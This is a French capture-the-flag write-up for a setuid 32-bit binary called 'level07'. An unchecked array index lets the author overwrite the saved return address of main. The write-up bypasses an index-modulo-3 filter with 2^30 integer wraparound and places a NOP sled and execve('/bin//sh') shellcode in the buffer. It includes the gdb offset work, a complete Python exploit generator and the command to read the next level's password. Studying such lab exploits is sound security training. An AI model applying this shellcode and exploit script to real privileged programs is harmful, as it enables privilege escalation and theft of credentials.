level07

# Démarche

## 1. **Reconnaissance**

   **Permissions / SUID.** Le binaire porte le bit setuid vers l'utilisateur du
   niveau suivant : un shell ouvert par l'executable tourne avec ses droits, ce
   qui permet de lire son `.pass`.


 ### Comportement de l'executable

    Service de stockage de nombres avec trois commandes :

    | Commande |
    |----------|
    | `store`  | écrit un nombre (4 octets) à l'index donné : `buffer[index] = number`
    | `read`   | affiche `buffer[index]` 
    | `quit`   | sort du programme 

    
`buffer` est un `int *`. Un `store` écrit donc 4 octets à l'adresse `buffer + index*4`

## 2. La vulnérabilité

```c
buffer[index] = number;   // index JAMAIS borné
```

`index` n'est pas vérifié par rapport à la taille réelle de `buffer`. On dispose donc d'une
**écriture arbitraire** (write-what-where) : écrire n'importe quelle valeur 4 octets, n'importe
où sur la pile.

Objectif : écraser l'**adresse de retour sauvegardée** de `main` pour détourner l'exécution
vers un shellcode qu'on aura nous-mêmes placé.

## 3. Les protections

```c
if (index % 3 == 0 || (number >> 24) == 0xb7) { /* refus */ }
```

- **`index % 3 == 0`** → interdit d'écrire à un index multiple de 3.
- **`(number >> 24) == 0xb7`** → interdit une valeur dont l'octet de poids fort vaut `0xb7`
  (typiquement une adresse libc sur ce binaire 32 bits). Ne nous gêne pas ici.

Au démarrage, `main` écrase aussi `argv` et `envp` (`memset`), ce qui **neutralise** la
technique classique du shellcode planqué dans une variable d'environnement. Conséquence :
le shellcode doit être stocké **dans `buffer` lui-même**, via `store`.

Le canari de `main` n'est jamais touché (on n'écrit qu'aux index choisis + l'index 114).

## 4. Stratégie d'exploitation

### 4.1 Contourner le filtre `% 3`

```
Ajouter 2³⁰ à un index permet de ne pas  verifier la condition si `index % 3 == 0` car
car index + 2³⁰ % 3 != 0
```
```
et etant donné que  buffer est un int * : chaque case occupe 4 octets.
Donc le compilateur va multipler notre index par 4 pour savoir ou inserer nos 4 octets relatif a notre nombre
```
- Dorenavant nous avons un index qui vaut  ***(index + 2³⁰) × 4*** cette valeur va donc au dela d'un unsigned int sur 32 bit.  Dès qu'un calcul dépasse (`2³²`), le compteur **repart de 0** (comme
un compteur kilométrique qui repasse de 999 à 000).

- On choisit `2³⁰` précisément pour que,
après le `× 4`, le dépassement soit **un tour complet exact** (`2³²`) : en repassant par 0, ce
tour s'efface entièrement, et il ne reste que l'index d'origine. D'où la valeur réellement
écrite :

```
         (index + 2³⁰) × 4  −  2³²
x  =  ───────────────────────────
                       4

         index * 4 +  2³² -  2³²
x  =  ───────────────────────────
                4

x =     index +  2³² -  2³²

x =     index

```

Exemple avec `index = 42` (multiple de 3) :

```
(42 + 2³⁰) × 4            = 4 294 967 464      (dépasse 2³² = 4 294 967 295)
4 294 967 464 − 2³²       =           168      (le tour complet 2³² s'efface)
168 / 4                   =            42       -> on retombe sur le index 42
```


### 4.2 Offset de l'adresse de retour (via gdb)

L'écriture est indexée sur `buffer` : `store` ne sait viser que `buffer + index*4`. Il faut
donc exprimer la position du RET **en index depuis le buffer** :

```
index = (adresse_du_RET − adresse_du_buffer) / 4
```

On lit les deux adresses directement dans gdb. L'avantage : le décalage que gdb ajoute à la
pile s'annule dans la soustraction (les deux adresses sont décalées du même montant), donc
l'offset obtenu est fiable.

**a) Adresse du RET** — on casse dans `main` (après le prologue) et on lit `info frame` :

```
gdb -q level07
b *main
r
info frame
```
```
Stack level 0, frame at 0xffffd710:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 ...
 Saved registers:
  eip at 0xffffd70c          <-- adresse du RET sauvegarde
```


**b) Adresse du buffer** — on lit `ebx`, où le binaire charge l'adresse du buffer
(point donné par le désassemblage) :

```
b *0x08048795
r
x/wx $esp+0x24
0xffffd544:     0x00000000
```



**c) Calcul** :

```
(gdb) p 0xffffd70c - 0xffffd544
$1 = 456
(gdb) p 456 / 4
$2 = 114
```

→ **RET est  à l'index 114**. Comme `114 % 3 == 0`, on l'écrit à l'index
`114 + 2³⁰ = 1073741938`.

Vérification avec `read` (doit segfault au `quit` quand on y met une valeur bidon) :

```
store 1 à l'index 1073741938
read  à l'index 114   → "Number at data[114] is 1"   (même case)
quit                  → Segmentation fault             (RET corrompu)
```

### 4.3 NOP sled + shellcode

On remplit le début de `buffer` avec un **NOP sled** (`0x90`) suivi du shellcode, écrits en
continu depuis l'index 0. Le RET pointe vers le **milieu du sled** : tant que l'adresse réelle
du buffer tombe dans la fenêtre couverte par le sled, l'exécution glisse jusqu'au shellcode.

### 4.4 Schéma du remplissage du buffer

```
 index:  0 ............... 39 40 ......... 46   47 ....... 113   114
       ┌──────────────────────┬──────────────┬──────────────┬───────┐
       │      NOP sled        │  shellcode   │  (non ecrit) │  RET  │
       │   90 90 90 90 ...    │  execve()    │   canari 106 │       │
       └──────────▲───────────┴──────────────┴──────────────┴───┬───┘
                  │                                              │
                  └──────────────── pointe vers ────────────────┘
                         RET = BUF+80 (milieu du sled)

 ret -> milieu du sled -> glisse sur les NOP -> shellcode  -> /bin/sh
```

- indexs **0-46** : écrits en continu (sled puis shellcode).
- indexs **47-113** : jamais écrits -> canari (index 106) intact.
- index **114** : RET de `main`, on y met l'adresse du milieu du sled.
- index multiple de 3 -> on envoie `index + 2³⁰` (même case, filtre contourné).

### 4.4 Le shellcode `execve("/bin//sh")` (25 octets)

```
31 c0            xor eax, eax        ; eax = 0
50               push eax            ; \0 terminateur de chaine
68 2f 2f 73 68   push "//sh"
68 2f 62 69 6e   push "/bin"         ; pile = "/bin//sh\0"
89 e3            mov ebx, esp        ; ebx -> "/bin//sh"
50               push eax            ; NULL (fin de argv)
53               push ebx            ; argv[0]
89 e1            mov ecx, esp        ; ecx -> argv
31 d2            xor edx, edx        ; edx = envp = NULL
b0 0b            mov al, 0xb         ; eax = 11 = execve
cd 80            int 0x80            ; execve("/bin//sh", argv, NULL)
```

## 5. Le script

```python
from __future__ import print_function
import struct

BUF  = 0xffffd524     # adresse du buffer
RET  = 114            # index de RET
WRAP  = 1073741824    # 2**30
SLED = 40             # nb de indexs de NOP devant le shellcode (grosse marge)

shellcode = (
    b"\x31\xc0\x50"             # xor eax,eax ; push eax
    b"\x68\x2f\x2f\x73\x68"     # push "//sh"
    b"\x68\x2f\x62\x69\x6e"     # push "/bin"
    b"\x89\xe3\x50\x53"         # mov ebx,esp ; push eax ; push ebx
    b"\x89\xe1\x31\xd2"         # mov ecx,esp ; xor edx,edx
    b"\xb0\x0b\xcd\x80"         # mov al,0xb ; int 0x80  -> execve
)

payload = b"\x90" * (SLED * 4) + shellcode   # sled + shellcode, en continu
while len(payload) % 4:                      # completer au multiple de 4
    payload += b"\x90"

def enc(i):                                  # +2**30 si i est multiple de 3
    return i + WRAP if i % 3 == 0 else i

def store(val, i):                           # une commande store = 3 lignes
    print("store"); print(val); print(enc(i))

# 1) ecrire sled + shellcode, index par index
for k in range(0, len(payload), 4):
    val = struct.unpack("<I", payload[k:k+4])[0]   # 4 octets -> entier little-endian
    store(val, k // 4)

# 2) RET -> milieu du sled (BUF + 80) : tolere +/- 80 octets d'erreur sur BUF
store(BUF + SLED * 2, RET)
print("quit")
```

### Points clés du code

- **`struct.unpack("<I", ...)`** : convertit 4 octets en entier **little-endian** (l'ordre du x86),
  ce que `store` attend en décimal.
- **`enc()`** : seule mécanique du contournement `% 3`. Appliquée à tous les stores.
- **`BUF + SLED*2`** (= `BUF + 80`) : on vise le centre du sled pour une tolérance de **±80 octets**.


## 6. Exécution

```bash
python inj.py > inj      # genere le fichier de commandes (48 store + quit)
cat inj - | ./level07    # garde stdin ouvert (le '-')
```

Le `-` après `cat inj` est essentiel : une fois le fichier épuisé par l'executable , stdin reste ouvert pour que  `/bin/sh` attende les commandes

```
 cat /home/users/level08/.pass
```
